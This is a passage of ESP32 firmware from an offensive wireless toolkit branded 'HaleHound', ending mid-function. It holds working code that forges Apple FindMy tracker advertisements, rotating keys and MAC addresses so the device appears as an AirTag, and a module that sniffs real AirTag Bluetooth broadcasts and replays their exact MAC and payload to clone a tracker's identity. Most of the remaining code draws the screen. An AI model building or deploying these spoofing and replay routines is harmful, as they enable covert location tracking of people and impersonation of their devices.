            color = HALEHOUND_GUNMETAL;
        }

        const unsigned char* icon = (const unsigned char*)pgm_read_ptr(&fySkulls[i]);
        tft.drawBitmap(x, FY_SKULL_Y, icon, 16, 16, color);
    }

    // TX/OFF label
    int labelX = skullStartX + (FY_SKULL_NUM * skullSpacing) + 5;
    tft.fillRect(labelX - 5, FY_SKULL_Y, 50, 16, TFT_BLACK);
    tft.setTextColor((S && S->broadcasting) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(labelX, FY_SKULL_Y + 4);
    tft.print((S && S->broadcasting) ? "TX!" : "OFF");
}

// ═══════════════════════════════════════════════════════════════════════════
// COUNTER BAR
// ═══════════════════════════════════════════════════════════════════════════

static void fyDrawCounter() {
    if (!S) return;

    int counterY = SCREEN_HEIGHT - 30;
    tft.fillRect(0, counterY, SCREEN_WIDTH, 25, TFT_BLACK);

    int barX = 10;
    int barY = counterY + 2;
    int barW = SCALE_W(140);
    int barH = 10;

    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);

    // Fill based on key cycle progress (keyIndex / FINDYOU_KEY_COUNT)
    float fillPct = (float)S->keyIndex / (float)FINDYOU_KEY_COUNT;
    if (fillPct > 1.0f) fillPct = 1.0f;
    int fillW = (int)(fillPct * barW);
    if (fillW > 0) {
        for (int px = 0; px < fillW; px++) {
            float ratio = (float)px / (float)barW;
            uint16_t c = fyGradientColor(ratio);
            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
        }
    }

    // Key index inside bar
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    char cntBuf[12];
    snprintf(cntBuf, sizeof(cntBuf), "%u/%u", S->keyIndex, FINDYOU_KEY_COUNT);
    tft.setCursor(barX + 4, barY + 1);
    tft.print(cntBuf);

    // Uptime
    unsigned long upSecs = (millis() - S->uptimeStart) / 1000;
    unsigned long upMins = upSecs / 60;
    upSecs %= 60;
    tft.setTextColor(S->broadcasting ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(SCALE_X(155), counterY + 3);
    tft.printf("%lum%02lus", upMins, upSecs);

    if (S->broadcasting) {
        tft.drawBitmap(SCALE_X(220), counterY + 1, bitmap_icon_skull_bluetooth, 16, 16, HALEHOUND_HOTPINK);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// FINDMY OF PAYLOAD BUILDER (from PROGMEM key)
// ═══════════════════════════════════════════════════════════════════════════

static void buildFindYouPayload(uint16_t keyIdx, uint8_t mac[6], uint8_t payload[31]) {
    // Read 28-byte P-224 public key X-coordinate from PROGMEM
    uint8_t pk[28];
    memcpy_P(pk, FINDYOU_KEYS[keyIdx], 28);

    // MAC = first 6 bytes of public key, bit 6+7 set (non-resolvable private addr)
    memcpy(mac, pk, 6);
    mac[0] |= 0xC0;

    // FindMy Offline Finding advertisement (identical format to real AirTags)
    payload[0]  = 0x1E;  // AD Length (30 bytes follow)
    payload[1]  = 0xFF;  // Manufacturer Specific Data
    payload[2]  = 0x4C;  // Apple Inc (low byte)
    payload[3]  = 0x00;  // Apple Inc (high byte)
    payload[4]  = 0x12;  // FindMy OF type
    payload[5]  = 0x19;  // OF data length (25 bytes)
    payload[6]  = 0x00;  // Status byte (maintained, full battery)
    memcpy(&payload[7], &pk[6], 22);  // pk[6..27] into payload[7..28]
    payload[29] = pk[0] >> 6;         // Hint (top 2 bits of first key byte)
    payload[30] = 0x00;               // Padding
}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 BROADCAST TASK
// ═══════════════════════════════════════════════════════════════════════════

static void fyBroadcastTask(void* param) {
    S->taskRunning = true;

    // Advertising parameters — non-connectable, all channels, ~1s interval (real AirTag cadence)
    static const esp_ble_adv_params_t advP = {
        .adv_int_min        = 0x0640,  // 1000ms (1600 × 0.625ms)
        .adv_int_max        = 0x0C80,  // 2000ms (3200 × 0.625ms)
        .adv_type           = ADV_TYPE_NONCONN_IND,
        .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
        .channel_map        = ADV_CHNL_ALL,
        .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };

    uint8_t mac[6];
    uint8_t payload[31];

    // Build initial payload for current key
    buildFindYouPayload(S->keyIndex, mac, payload);

    esp_ble_gap_stop_advertising();
    esp_ble_gap_set_rand_addr(mac);
    esp_ble_gap_config_adv_data_raw(payload, 31);
    delay(1);
    esp_ble_gap_start_advertising((esp_ble_adv_params_t*)&advP);

    S->totalKeys++;
    S->lastMAC[0] = mac[0]; S->lastMAC[1] = mac[1]; S->lastMAC[2] = mac[2];
    S->lastPK[0] = payload[7]; S->lastPK[1] = payload[8]; S->lastPK[2] = payload[9];
    S->rotationStart = millis();

    while (S->broadcasting) {
        // Check if rotation interval elapsed
        unsigned long elapsed = millis() - S->rotationStart;
        if (elapsed >= (unsigned long)S->rotationSecs * 1000UL) {
            // Rotate to next key
            S->keyIndex++;
            if (S->keyIndex >= FINDYOU_KEY_COUNT) {
                S->keyIndex = 0;  // Wrap around
            }

            // Stop current advertisement
            esp_ble_gap_stop_advertising();

            // Build new payload from next key
            buildFindYouPayload(S->keyIndex, mac, payload);

            // Start advertising with new identity
            esp_ble_gap_set_rand_addr(mac);
            esp_ble_gap_config_adv_data_raw(payload, 31);
            delay(1);
            esp_ble_gap_start_advertising((esp_ble_adv_params_t*)&advP);

            S->totalKeys++;
            S->lastMAC[0] = mac[0]; S->lastMAC[1] = mac[1]; S->lastMAC[2] = mac[2];
            S->lastPK[0] = payload[7]; S->lastPK[1] = payload[8]; S->lastPK[2] = payload[9];
            S->rotationStart = millis();

            #if CYD_DEBUG
            Serial.printf("[FINDYOU] Rotated to key %u, MAC %02X:%02X:%02X:...\n",
                          S->keyIndex, mac[0], mac[1], mac[2]);
            #endif
        }

        // Check exit every 100ms
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    esp_ble_gap_stop_advertising();
    S->taskRunning = false;
    S->taskHandle = NULL;
    vTaskDelete(NULL);
}

// ═══════════════════════════════════════════════════════════════════════════
// START / STOP / TOGGLE
// ═══════════════════════════════════════════════════════════════════════════

static void startBroadcast() {
    if (!S || S->broadcasting) return;
    S->broadcasting = true;
    S->rotationStart = millis();
    fyDrawIconBar();
    fyDrawHeader();
    xTaskCreatePinnedToCore(fyBroadcastTask, "fyTx", 4096, NULL, 1, &S->taskHandle, 0);

    #if CYD_DEBUG
    Serial.printf("[FINDYOU] Started (Core 0), key %u, interval %us\n", S->keyIndex, S->rotationSecs);
    #endif
}

static void stopBroadcast() {
    if (!S) return;
    S->broadcasting = false;

    // Wait for task to exit gracefully (up to 500ms)
    if (S->taskHandle != NULL) {
        unsigned long start = millis();
        while (S->taskRunning && (millis() - start < 500)) {
            delay(10);
        }
        if (S->taskRunning) {
            vTaskDelete(S->taskHandle);
            S->taskRunning = false;
        }
        S->taskHandle = NULL;
    }

    esp_ble_gap_stop_advertising();
    fyDrawIconBar();
    fyDrawHeader();

    #if CYD_DEBUG
    Serial.println("[FINDYOU] Stopped");
    #endif
}

static void toggleBroadcast() {
    if (S && S->broadcasting) stopBroadcast(); else startBroadcast();
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP / LOOP / EXIT / CLEANUP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (S && S->initialized) return;

    #if CYD_DEBUG
    Serial.println("[FINDYOU] Initializing Find You...");
    #endif

    // Allocate state on heap
    S = (FyState*)calloc(1, sizeof(FyState));
    if (!S) {
        Serial.println("[FINDYOU] FATAL: calloc failed");
        return;
    }

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    // WiFi off, BLE on
    WiFi.mode(WIFI_OFF);
    delay(200);

    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
    delay(150);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    Serial.println("[FINDYOU] BLE stack initialized, max TX power set");

    // Initialize state
    S->keyIndex          = 0;
    S->rotationOptIdx    = 1;  // Default: 30s
    S->rotationSecs      = FY_ROTATION_OPTS[S->rotationOptIdx];
    S->rotationStart     = 0;
    S->broadcasting      = false;
    S->taskRunning       = false;
    S->taskHandle        = NULL;
    S->totalKeys         = 0;
    S->uptimeStart       = millis();
    S->initialized       = true;
    S->exitRequested     = false;
    S->staticDrawn       = false;
    S->lastBroadcastState = false;
    S->lastDisplayUpdate = millis();
    S->lastIconTap       = 0;

    // Draw initial UI
    fyDrawIconBar();
    fyDrawHeader();
    fyDrawActivity();
    fyDrawSkulls();
    fyDrawCounter();

    #if CYD_DEBUG
    Serial.printf("[FINDYOU] Ready — %u keys loaded, rotation %us\n",
                  FINDYOU_KEY_COUNT, S->rotationSecs);
    #endif
}

void loop() {
    if (!S || !S->initialized) return;

    touchButtonsUpdate();

    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
            // Debounce icon taps (300ms)
            if (millis() - S->lastIconTap < 300) return;
            S->lastIconTap = millis();
            waitForTouchRelease();

            if (tx >= 5 && tx <= 30) {
                // Back button
                if (S->broadcasting) stopBroadcast();
                S->exitRequested = true;
                return;
            }
            else if (tx >= 50 && tx <= 80) {
                // Play/Stop toggle
                toggleBroadcast();
                return;
            }
            else if (tx >= 100 && tx <= 150) {
                // Rotation interval cycle (only when stopped)
                if (!S->broadcasting) {
                    S->rotationOptIdx = (S->rotationOptIdx + 1) % FY_ROTATION_COUNT;
                    S->rotationSecs = FY_ROTATION_OPTS[S->rotationOptIdx];
                    fyDrawIconBar();
                    #if CYD_DEBUG
                    Serial.printf("[FINDYOU] Rotation interval: %us\n", S->rotationSecs);
                    #endif
                }
                return;
            }
        }
    }

    // Hardware button support
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (S->broadcasting) stopBroadcast();
        S->exitRequested = true;
        return;
    }
    if (buttonPressed(BTN_SELECT)) toggleBroadcast();

    yield();

    // 10Hz display refresh
    if (millis() - S->lastDisplayUpdate >= 100) {
        fyDrawActivity();
        fyDrawSkulls();
        fyDrawCounter();
        S->lastDisplayUpdate = millis();
    }
}

bool isExitRequested() {
    return S && S->exitRequested;
}

void cleanup() {
    if (S) {
        if (S->broadcasting) stopBroadcast();
        if (S->taskHandle) {
            S->broadcasting = false;
            unsigned long start = millis();
            while (S->taskRunning && (millis() - start < 500)) delay(10);
            if (S->taskRunning) vTaskDelete(S->taskHandle);
        }
    }

    BLEDevice::deinit(false);

    if (S) {
        free(S);
        S = nullptr;
    }

    #if CYD_DEBUG
    Serial.println("[FINDYOU] Cleanup complete");
    #endif
}

}  // namespace FindYou


// ═══════════════════════════════════════════════════════════════════════════
// AIRTAG REPLAY - FindMy Advertisement Sniff & Replay
// Captures real AirTag/FindMy BLE advertisements (MAC + full 31-byte payload)
// then replays them — ESP32 impersonates the real AirTag identity
// Replay works until real AirTag rotates key: 15min near owner, 24hr separated
// ═══════════════════════════════════════════════════════════════════════════

namespace AirTagReplay {

// ═══════════════════════════════════════════════════════════════════════════
// CONSTANTS
// ═══════════════════════════════════════════════════════════════════════════

#define AR_MAX_TAGS        4
#define AR_MAX_VISIBLE     4
#define AR_LINE_HEIGHT     20
#define AR_SCAN_DURATION   4
#define AR_SKULL_Y         (SCREEN_HEIGHT - 48)
#define AR_SKULL_NUM       8
#define AR_BAR_Y           (SCREEN_HEIGHT - 30)

// ═══════════════════════════════════════════════════════════════════════════
// DATA STRUCTURES — 40 bytes per captured tag
// ═══════════════════════════════════════════════════════════════════════════

struct CapturedTag {
    uint8_t mac[6];        // BLE MAC (= PK[0..5] | 0xC0)
    uint8_t payload[31];   // Full raw advertisement payload
    int8_t  rssi;          // Signal strength at capture
    uint8_t battery;       // 0=full, 1=medium, 2=low, 3=critical
    bool    selected;      // User selected for replay
};

// ═══════════════════════════════════════════════════════════════════════════
// HEAP-ALLOCATED STATE — Only 4 bytes BSS (one pointer)
// All module state lives on heap, allocated in setup(), freed in cleanup()
// This avoids DRAM segment overflow at link time.
// ═══════════════════════════════════════════════════════════════════════════

struct ArState {
    CapturedTag captured[AR_MAX_TAGS];
    int8_t tagCount;
    int8_t currentIndex;
    int8_t listStartIndex;
    int8_t totalScans;
    volatile bool replaying;
    volatile bool replayTaskRunning;
    bool exitRequested;
    bool initialized;
    bool staticDrawn;
    bool lastReplayState;
    volatile uint32_t replayCount;
    volatile uint32_t rateWindowCount;
    volatile uint16_t replayRate;
    TaskHandle_t replayTaskHandle;
    BLEScan* pArScan;
    unsigned long lastDisplayUpdate;
    unsigned long lastIconTap;
};

static ArState* S = nullptr;

// ═══════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════

static void arMacToStr(const uint8_t* mac, char* buf, size_t len) {
    snprintf(buf, len, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static const char* arBatteryStr(uint8_t level) {
    switch (level) {
        case 0: return "FULL";
        case 1: return "MED";
        case 2: return "LOW";
        case 3: return "CRIT";
        default: return "???";
    }
}

static uint16_t arBatteryColor(uint8_t level) {
    switch (level) {
        case 0: return HALEHOUND_GREEN;
        case 1: return HALEHOUND_MAGENTA;
        case 2: return HALEHOUND_HOTPINK;
        case 3: return 0xF800;  // Red
        default: return HALEHOUND_GUNMETAL;
    }
}

static const char* arProximityStr(int rssi) {
    if (rssi > -40) return "< 1m";
    if (rssi > -55) return "1-3m";
    if (rssi > -70) return "3-8m";
    if (rssi > -85) return "8-15m";
    return "> 15m";
}

static void arDrawRssiBar(int x, int y, int rssi) {
    int bars = 0;
    if (rssi > -40) bars = 5;
    else if (rssi > -55) bars = 4;
    else if (rssi > -65) bars = 3;
    else if (rssi > -75) bars = 2;
    else if (rssi > -90) bars = 1;

    for (int i = 0; i < 5; i++) {
        int barH = 3 + i * 2;
        int barY = y + (12 - barH);
        uint16_t color = (i < bars) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
        tft.fillRect(x + i * 4, barY, 3, barH, color);
    }
}

// Gradient color from cyan to hot pink (ratio 0.0 -> 1.0) — same as PhantomFlood
static uint16_t arGradientColor(float ratio) {
    if (ratio > 1.0f) ratio = 1.0f;
    if (ratio < 0.0f) ratio = 0.0f;
    uint8_t r = (uint8_t)(ratio * 255);
    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
    return tft.color565(r, g, b);
}

// Find existing captured tag by MAC, returns index or -1
static int findCaptured(const uint8_t* mac) {
    for (int i = 0; i < S->tagCount; i++) {
        if (memcmp(S->captured[i].mac, mac, 6) == 0) return i;
    }
    return -1;
}

// ═══════════════════════════════════════════════════════════════════════════
// SCAN ENGINE — Passive BLE scan, captures full FindMy OF advertisement
// ═══════════════════════════════════════════════════════════════════════════

static void processScanResults(BLEScanResults results) {
    int count = results.getCount();

    for (int i = 0; i < count; i++) {
        BLEAdvertisedDevice device = results.getDevice(i);

        if (!device.haveManufacturerData()) continue;

        std::string mfgData = device.getManufacturerData();
        if (mfgData.length() < 27) continue;  // Need at least company(2)+type(1)+len(1)+status(1)+pk22=27

        // Check for Apple company ID (0x004C) + FindMy type (0x12) + OF length (0x19)
        uint8_t compLow  = (uint8_t)mfgData[0];
        uint8_t compHigh = (uint8_t)mfgData[1];
        uint8_t type     = (uint8_t)mfgData[2];
        uint8_t len      = (uint8_t)mfgData[3];

        if (compLow != 0x4C || compHigh != 0x00) continue;  // Not Apple
        if (type != 0x12 || len != 0x19) continue;           // Not FindMy OF

        // Get MAC address
        uint8_t mac[6];
        memcpy(mac, *device.getAddress().getNative(), 6);

        // Check if already captured — update RSSI only
        int existing = findCaptured(mac);
        if (existing >= 0) {
            S->captured[existing].rssi = (int8_t)device.getRSSI();
            continue;
        }

        // Full — can't add more
        if (S->tagCount >= AR_MAX_TAGS) continue;

        // Capture this tag
        CapturedTag& tag = S->captured[S->tagCount];
        memcpy(tag.mac, mac, 6);

        // Reconstruct full 31-byte advertisement payload:
        // getManufacturerData() returns bytes AFTER the AD type header
        // We need to prepend [0x1E, 0xFF] to make the full 31-byte advert
        tag.payload[0] = 0x1E;  // AD Length (30 bytes follow)
        tag.payload[1] = 0xFF;  // Manufacturer Specific Data AD type

        // Copy manufacturer data (up to 29 bytes to fill payload[2..30])
        int copyLen = mfgData.length();
        if (copyLen > 29) copyLen = 29;
        memcpy(&tag.payload[2], mfgData.data(), copyLen);

        // Zero-pad if manufacturer data was shorter than 29 bytes
        if (copyLen < 29) {
            memset(&tag.payload[2 + copyLen], 0, 29 - copyLen);
        }

        // Extract battery from status byte (bits 6-7)
        uint8_t statusByte = (mfgData.length() > 4) ? (uint8_t)mfgData[4] : 0;
        tag.battery = (statusByte >> 6) & 0x03;

        tag.rssi = (int8_t)device.getRSSI();
        tag.selected = false;

        S->tagCount++;

        #if CYD_DEBUG
        char macStr[18];
        arMacToStr(mac, macStr, sizeof(macStr));
        Serial.printf("[REPLAY] Captured tag %d: %s RSSI:%d BAT:%d payload[0..5]=%02X%02X%02X%02X%02X%02X\n",
                      S->tagCount, macStr, device.getRSSI(), tag.battery,
                      tag.payload[0], tag.payload[1], tag.payload[2], tag.payload[3],
                      tag.payload[4], tag.payload[5]);
        #endif
    }
}

static void runScan() {
    S->totalScans++;

    BLEScanResults results = S->pArScan->start(AR_SCAN_DURATION, false);
    processScanResults(results);
    S->pArScan->clearResults();
}

// ═══════════════════════════════════════════════════════════════════════════
// REPLAY ENGINE — Raw ESP-IDF broadcast cycle (same as Phantom Flood)
// Uses captured MAC + payload for exact identity cloning
// ═══════════════════════════════════════════════════════════════════════════

static void doReplayBroadcast(CapturedTag& tag) {
    esp_ble_gap_stop_advertising();

    // Set exact captured MAC address
    esp_ble_gap_set_rand_addr(tag.mac);
    esp_ble_gap_config_adv_data_raw(tag.payload, 31);
    delay(1);

    // Adv params — non-connectable, random address, all channels
    // Declared on stack (not static) — avoids BSS for const struct
    const esp_ble_adv_params_t advP = {
        .adv_int_min = 0x20,
        .adv_int_max = 0x20,
        .adv_type = ADV_TYPE_NONCONN_IND,
        .own_addr_type = BLE_ADDR_TYPE_RANDOM,
        .channel_map = ADV_CHNL_ALL,
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    esp_ble_gap_start_advertising((esp_ble_adv_params_t*)&advP);

    // Real AirTags advertise ~every 2s when separated — match that cadence
    delay(2000);
    esp_ble_gap_stop_advertising();

    S->replayCount++;
    S->rateWindowCount++;
}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 REPLAY TASK
// ═══════════════════════════════════════════════════════════════════════════

static void replayTxTask(void* param) {
    S->replayTaskRunning = true;
    unsigned long rateStart = millis();

    while (S->replaying) {
        // Find the selected tag
        int targetIdx = -1;
        for (int i = 0; i < S->tagCount; i++) {
            if (S->captured[i].selected) { targetIdx = i; break; }
        }
        if (targetIdx < 0) {
            S->replaying = false;
            break;
        }

        doReplayBroadcast(S->captured[targetIdx]);

        unsigned long now = millis();
        if (now - rateStart >= 1000) {
            S->replayRate = (uint16_t)S->rateWindowCount;
            S->rateWindowCount = 0;
            rateStart = now;
        }

        vTaskDelay(1);
    }

    S->replayTaskRunning = false;
    vTaskDelete(NULL);
}

static void startReplayTask() {
    if (S->replayTaskHandle != NULL) return;
    xTaskCreatePinnedToCore(replayTxTask, "arReplay", 4096, NULL, 1, &S->replayTaskHandle, 0);
}

static void stopReplayTask() {
    S->replaying = false;
    if (S->replayTaskHandle == NULL) return;

    unsigned long start = millis();
    while (S->replayTaskRunning && (millis() - start < 3000)) {
        delay(10);
    }

    if (S->replayTaskRunning) {
        vTaskDelete(S->replayTaskHandle);
    }

    S->replayTaskHandle = NULL;
    S->replayTaskRunning = false;
    esp_ble_gap_stop_advertising();
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING — Phase 1: SCAN (list view) / Phase 2: REPLAY (broadcasting)
// ═══════════════════════════════════════════════════════════════════════════

static void arDrawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    // Back
    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    // Scan
    tft.drawBitmap(60, ICON_BAR_Y, bitmap_icon_undo, 16, 16, HALEHOUND_MAGENTA);
    // Play/Stop
    tft.drawBitmap(110, ICON_BAR_Y, bitmap_icon_start, 16, 16,
                   S->replaying ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA);
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static void arDrawHeader() {
    tft.fillRect(0, 38, SCREEN_WIDTH, 26, TFT_BLACK);
    tft.drawLine(0, 38, SCREEN_WIDTH, 38, HALEHOUND_HOTPINK);

    drawGlitchTitle(58, "SNIFF");

    tft.drawLine(0, 62, SCREEN_WIDTH, 62, HALEHOUND_HOTPINK);
}

static void arDrawStatus(const char* msg, uint16_t color) {
    tft.fillRect(0, 63, SCREEN_WIDTH, 14, TFT_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(5, 66);
    tft.print(msg);
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 1: TAG LIST — scrollable list of captured tags
// ═══════════════════════════════════════════════════════════════════════════

static void arDrawTagList() {
    int listY = 78;
    tft.fillRect(0, listY, SCREEN_WIDTH, SCREEN_HEIGHT - listY, HALEHOUND_BLACK);

    // Header info
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(5, listY);
    tft.printf("TAGS: %d", S->tagCount);
    tft.setCursor(80, listY);
    tft.printf("SCANS: %d", S->totalScans);

    if (S->tagCount == 0) {
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(10, listY + 30);
        tft.print("No FindMy trackers found");
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(10, listY + 48);
        tft.print("Scanning for AirTags...");
        return;
    }

    int y = listY + 14;
    for (int i = 0; i < AR_MAX_VISIBLE && i + S->listStartIndex < S->tagCount; i++) {
        int idx = i + S->listStartIndex;
        CapturedTag& t = S->captured[idx];

        // Highlight selected / current
        if (idx == S->currentIndex) {
            tft.fillRect(0, y - 1, SCREEN_WIDTH, AR_LINE_HEIGHT, HALEHOUND_DARK);
        }

        // Selection marker
        if (t.selected) {
            tft.setTextColor(HALEHOUND_HOTPINK, (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
            tft.setCursor(2, y + 3);
            tft.print(">");
        }

        // RSSI bars
        arDrawRssiBar(10, y + 1, t.rssi);

        // Short MAC (last 3 octets)
        uint16_t textCol = (idx == S->currentIndex) ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
        tft.setTextColor(textCol, (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
        tft.setCursor(33, y + 3);
        char shortMac[12];
        snprintf(shortMac, sizeof(shortMac), "%02X:%02X:%02X",
                 t.mac[3], t.mac[4], t.mac[5]);
        tft.print(shortMac);

        // Battery
        tft.setTextColor(arBatteryColor(t.battery), (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
        tft.setCursor(93, y + 3);
        tft.print(arBatteryStr(t.battery));

        // RSSI value
        tft.setTextColor(HALEHOUND_VIOLET, (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
        tft.setCursor(130, y + 3);
        tft.printf("%ddB", t.rssi);

        // Proximity
        tft.setTextColor(HALEHOUND_BRIGHT, (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
        tft.setCursor(175, y + 3);
        tft.print(arProximityStr(t.rssi));

        y += AR_LINE_HEIGHT;
    }

    // Footer
    tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("UP/DN=Nav SEL=Choose PLAY=TX");
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 2: REPLAY VIEW — broadcasting captured tag identity
// ═══════════════════════════════════════════════════════════════════════════

// PROGMEM skull icon table (pointers live in flash, not DRAM)
static const unsigned char* const arSkulls[AR_SKULL_NUM] PROGMEM = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

static void arDrawStaticReplayInfo() {
    tft.fillRect(0, 78, SCREEN_WIDTH, AR_SKULL_Y - 80, TFT_BLACK);

    // Find selected tag
    int selIdx = -1;
    for (int i = 0; i < S->tagCount; i++) {
        if (S->captured[i].selected) { selIdx = i; break; }
    }
    if (selIdx < 0) return;

    CapturedTag& t = S->captured[selIdx];
    int y = 80;

    tft.setTextSize(1);

    // Full MAC
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("MAC: ");
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    char macStr[18];
    arMacToStr(t.mac, macStr, sizeof(macStr));
    tft.print(macStr);
    y += 14;

    // Payload preview (first 8 bytes after header)
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("PLD: ");
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    char pldbuf[28];
    snprintf(pldbuf, sizeof(pldbuf), "%02X%02X%02X%02X %02X%02X%02X%02X",
             t.payload[2], t.payload[3], t.payload[4], t.payload[5],
             t.payload[6], t.payload[7], t.payload[8], t.payload[9]);
    tft.print(pldbuf);
    y += 14;

    // Capture RSSI + proximity
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("CAP: ");
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    tft.printf("%ddBm (%s)", t.rssi, arProximityStr(t.rssi));
    y += 14;

    // Battery
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("BAT: ");
    tft.setTextColor(arBatteryColor(t.battery), TFT_BLACK);
    tft.print(arBatteryStr(t.battery));
    y += 18;

    // Status line
    if (S->replaying) {
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(5, y);
        tft.print("[!] TRANSMITTING        ");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(5, y);
        tft.print("[*] Tap play to replay  ");
    }

    S->staticDrawn = true;
    S->lastReplayState = S->replaying;
}

static void arDrawDynamicReplay() {
    // Redraw static on first call or state change
    if (!S->staticDrawn || (S->replaying != S->lastReplayState)) {
        arDrawStaticReplayInfo();
    }

    if (!S->replaying) return;

    tft.setTextSize(1);

    // Replay count + rate
    char buf[36];
    snprintf(buf, sizeof(buf), "[+] TX: %-8lu (%d/s)  ", S->replayCount, S->replayRate);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(5, 148);
    tft.print(buf);
}

static void arDrawSkulls() {
    int skullStartX = 10;
    int skullSpacing = (SCREEN_WIDTH - 20) / AR_SKULL_NUM;
    int frame = (int)(millis() / 120);

    for (int i = 0; i < AR_SKULL_NUM; i++) {
        int x = skullStartX + (i * skullSpacing);
        tft.fillRect(x, AR_SKULL_Y, 16, 16, TFT_BLACK);

        uint16_t color;
        if (S->replaying) {
            int phase = (frame + i) % 8;
            if (phase < 4) {
                color = arGradientColor(phase / 3.0f);
            } else {
                float ratio = (phase - 4) / 3.0f;
                uint8_t r = 255 - (uint8_t)(ratio * 255);
                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            }
        } else {
            color = HALEHOUND_GUNMETAL;
        }

        const unsigned char* icon = (const unsigned char*)pgm_read_ptr(&arSkulls[i]);
        tft.drawBitmap(x, AR_SKULL_Y, icon, 16, 16, color);
    }

    // TX/OFF label
    int labelX = skullStartX + (AR_SKULL_NUM * skullSpacing) + 5;
    tft.fillRect(labelX - 5, AR_SKULL_Y, 50, 16, TFT_BLACK);
    tft.setTextColor(S->replaying ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(labelX, AR_SKULL_Y + 4);
    tft.print(S->replaying ? "TX!" : "OFF");
}

static void arDrawCounterBar() {
    tft.fillRect(0, AR_BAR_Y, SCREEN_WIDTH, 25, TFT_BLACK);

    int barX = 10;
    int barY = AR_BAR_Y + 2;
    int barW = SCALE_W(140);
    int barH = 10;

    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);

    // Fill proportional to rate (max ~1 replay every 2s = 0.5/s, but show at higher scale)
